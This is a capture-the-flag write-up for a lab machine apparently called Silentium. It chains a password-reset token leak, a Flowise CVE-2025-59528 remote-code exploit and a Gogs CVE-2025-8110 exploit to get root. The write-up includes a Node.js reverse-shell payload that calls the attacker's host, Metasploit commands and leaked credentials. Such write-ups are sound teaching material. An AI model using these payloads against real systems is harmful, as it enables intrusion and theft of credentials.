# Silentium

----

<img width="1586" height="288" alt="image" src="https://github.com/user-attachments/assets/289b890a-547b-4f0b-9973-45b35c48403c" />

---

## Nmap Scan 

```
nmap -sCV -Pn silentium.htb 
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-28 16:40 EDT
Nmap scan report for silentium.htb (10.129.43.126)
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Silentium | Institutional Capital & Lending Solutions
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.90 seconds

```

----

```
http://silentium.htb/
```

<img width="1804" height="621" alt="image" src="https://github.com/user-attachments/assets/f87fcd44-687c-4fd2-a014-30215b26ab05" />

> found some names

- **`Marcus Thorne`**
- **`Ben`**
- **`Elena Rossi`**

> ### i try to fuzz on endpoints but can't find

### i will try to find subdomains

```
ffuf -u http://silentium.htb -H "Host: FUZZ.silentium.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 178
```

<img width="1655" height="523" alt="image" src="https://github.com/user-attachments/assets/d5746569-b1dc-43a7-9089-a839f1dccff9" />

---

```
http://staging.silentium.htb/signin
```

<img width="1676" height="574" alt="image" src="https://github.com/user-attachments/assets/c8c5e542-2799-4859-b7ed-415ed1844fa9" />

## i found this endpoint in burp that discover many other endpoints

```
/assets/index-C6GKaUTA.js
```

<img width="1653" height="476" alt="image" src="https://github.com/user-attachments/assets/7904aae1-cf51-48d1-9d20-531565329bff" />

## found

```
/assets/forgotPassword-Dt6O5dqm.js
```

## let's discover forget-password flow 

> ## let's try usernames that we found before
>: **`ben`** worked

```
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
     -H "Content-Type: application/json" \
     -d '{"user": {"email": "ben@silentium.htb"}}'
```

<img width="1508" height="180" alt="image" src="https://github.com/user-attachments/assets/f92fe36e-cb14-4d8d-9277-aa8852f9903f" />

<img width="1577" height="399" alt="image" src="https://github.com/user-attachments/assets/43fc4758-e476-4ef7-9038-632f8881e6d0" />

```json
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "credential": "$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG",
    "tempToken": "oJbQFnUtbVklHmlqgGkiFhdmDhaVxuO7oOYOcWqFKuJvBlopxmO2aJvKtq8mazhL",
    "tokenExpiry": "2026-04-28T21:51:08.563Z",
    "status": "active",
    "createdDate": "2026-01-29T20:14:57.000Z",
    "updatedDate": "2026-04-28T21:36:08.000Z",
    "createdBy": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "updatedBy": "e26c9d6c-678c-4c10-9e36-01813e8fea73"
  },
  "organization": {},
  "organizationUser": {},
  "workspace": {},
  "workspaceUser": {},
  "role": {}
}
```

> ## By immediately generating a fresh token and using a corrected JSON payload, the password was successfully reset.

<img width="949" height="791" alt="image" src="https://github.com/user-attachments/assets/4bf99d23-26fb-4103-9330-9e0e87db5e05" />

```
ben@silentium.htb : Pass@123
```

## logged in successfully

<img width="1918" height="670" alt="image" src="https://github.com/user-attachments/assets/d0773f55-0c31-4c7e-ac87-b4122eb4d23a" />

## found version 

<img width="1404" height="351" alt="image" src="https://github.com/user-attachments/assets/94c35fa9-4deb-4f26-b2a5-d68a1a04d30e" />

## i search for exploit to this version

<img width="1596" height="511" alt="image" src="https://github.com/user-attachments/assets/016cd61d-9bae-425f-9a60-33ff3b0267b5" />

## found [CVE-2025-59528](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p)

1. Create a New Chatflow.
2. Add a CustomMCP node.
3. Modify the mcpServerConfig field with a Node.js reverse shell payload.
Exploit Payload

First, start a listener on the attacking machine:

```
nc -lnvp 4444
```

```
{
  "mcpServers": {
    "pwn": {
      "command": "node",
      "args": [
        "-e",
        "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.10.17.199/4444 0>&1\"')"
      ]
    }
  }
}
```

## or use metasploit

```
search Flowise
use 3
```

```
msf exploit(multi/http/flowise_js_rce) > set RHOSTS staging.silentium.htb
RHOSTS => staging.silentium.htb
msf exploit(multi/http/flowise_js_rce) > set RPORT 80
RPORT => 80
msf exploit(multi/http/flowise_js_rce) > set FLOWISE_EMAIL ben@silentium.htb
FLOWISE_EMAIL => ben@silentium.htb
msf exploit(multi/http/flowise_js_rce) > set FLOWISE_PASSWORD Pass@123
FLOWISE_PASSWORD => admin@123
msf exploit(multi/http/flowise_js_rce) > set LHOST 10.10.17.200
LHOST => 10.10.17.200
```

```
run
```

<img width="1381" height="406" alt="image" src="https://github.com/user-attachments/assets/b4c30f3e-d1e7-4914-9f8f-e843570d5e82" />

## now i root in container let's try to scape

<img width="809" height="435" alt="image" src="https://github.com/user-attachments/assets/47b3b929-5088-45ce-a6e5-9752a8ad8b4b" />

## Here's a script to see if it can escape

#### [deepce](https://github.com/stealthcopter/deepce)

```
upload ./deepce
shell
chmod +x ./deepce
./deepce
```

<img width="1357" height="415" alt="image" src="https://github.com/user-attachments/assets/73a94a4d-1f24-4f0c-ba53-03ae16d99791" />

```
FLOWISE_PASSWORD=F1l3_d0ck3r
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD                                                                                 
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD                                                                              
SECRETKEY_PATH=/root/.flowise                                                                                                                  
SMTP_PASSWORD=r04D!!_R4ge                                                                                                                      
ALLOW_UNAUTHORIZED_CERTS=true
DATABASE_PATH=/root/.flowise                                                                                                                   
FLOWISE_USERNAME=ben                                                                                                                           
HOME=/root                                                                                                                                     
HOSTNAME=c78c3cceb7ba                                                                                                                          
JWT_AUDIENCE=AUDIENCE                                                                                                                          
JWT_ISSUER=ISSUER                                                                                                                              
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200                      
```

## found two passwords 

> try first **`F1l3_d0ck3r`** but failed but when try **`r04D!!_R4ge`** it work

```
ssh ben@10.129.43.126 
```

<img width="928" height="183" alt="image" src="https://github.com/user-attachments/assets/25653fdf-c8c6-4227-b56e-e156e01bc378" />

## privesc

## i send linpeas and found internal service running

```ruby
tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      -                                                              
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:35831         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8025          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1025          0.0.0.0:*               LISTEN      -   

```

```
ps aux
```

<img width="1115" height="95" alt="image" src="https://github.com/user-attachments/assets/f29cadd2-96e1-4901-affb-eeb6e57488b2" />

---

## SSH proxy port

```
ssh -L 3001:127.0.0.1:3001 ben@10.129.245.103
```

```
http://127.0.0.1:3001/user/sign_up
```

<img width="1719" height="577" alt="image" src="https://github.com/user-attachments/assets/4cc83431-f9f9-4935-adeb-9d1e7a0faabf" />

```
frank : 12345678
```

## search for gog rce exploit

<img width="1787" height="650" alt="image" src="https://github.com/user-attachments/assets/543c7c6f-4711-4ef3-8a05-c71ae22c9c8a" />

## [CVE-2025-8110](https://github.com/TYehan/CVE-2025-8110-Gogs-RCE-Exploit)

```
python3 exploit.py
```

<img width="1240" height="128" alt="image" src="https://github.com/user-attachments/assets/4bbac3c5-c5ee-4852-9915-913e2c4ee675" />

### create a tkoen application at `http://127.0.0.1:3001/user/settings/applications`

<img width="1574" height="436" alt="image" src="https://github.com/user-attachments/assets/2a240865-ac09-47db-849d-471e67300bf2" />

## exploit

```
python3 exploit.py -u http://127.0.0.1:3001 -un frank -pw 12345678 -t 397a859a0425a8a8073094a410a54488e6fa2337 -lh 10.10.17.199 -lp 9999 
```

<img width="1423" height="382" alt="image" src="https://github.com/user-attachments/assets/8fdcc23d-db0e-442c-a540-87b559925c1c" />

---

<img width="1483" height="290" alt="image" src="https://github.com/user-attachments/assets/af2cc1d8-cd51-4a12-9a45-1e5a5ac9e70c" />

